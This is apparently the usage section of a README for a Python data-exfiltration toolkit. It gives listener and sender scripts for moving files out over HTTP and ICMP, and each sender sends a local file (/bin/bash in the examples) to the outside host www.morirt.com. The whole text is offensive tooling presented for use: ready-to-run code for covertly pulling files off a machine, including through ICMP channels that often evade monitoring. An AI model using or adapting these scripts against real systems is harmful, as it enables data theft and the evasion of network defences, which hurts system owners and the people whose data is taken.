## Usage example:
### HTTP Exfilatration Server:
    #!/usr/bin/python
    from exfiltration.http_exfiltration import *
    def main():
    	print "Starting a listener: "
    	listen("127.0.0.1", 80)
    
    if __name__ == "__main__":
    	main()

### HTTP Exfiltration Client:
    #!/usr/bin/python
    
    from exfiltration.http_exfiltration import *
    
    def main():
        FILE_TO_EXFIL = "/bin/bash"
        ADDR = "www.morirt.com"
    
        if send_file(ADDR, FILE_TO_EXFIL) == 0:
            print "File exfiltrated okay."
        else:
            print "Damn thing failed."
    
    if __name__ == "__main__":
        main()
        
### ICMP Server
    #!/usr/bin/python
    
    from exfiltration.icmp_exfiltration import *
    
    def main():
        ADDR = "127.0.0.1"
        TMP_PATH = "/tmp/"
        
        init_listener(ADDR, TMP_PATH)
    
    if __name__ == "__main__":
        main()

### ICMP Exfiltrator
    #!/usr/bin/python
    
    from exfiltration.icmp_exfiltration import *
    
    def main():
        FILE_TO_EXFIL = "/bin/bash"
        ADDR = "www.morirt.com"
        
        if send_file(ADDR, FILE_TO_EXFIL) == 0:
            print "File exfiltrated okay."
        else:
            print "Damn thing failed."
    
    if __name__ == "__main__":
        main()



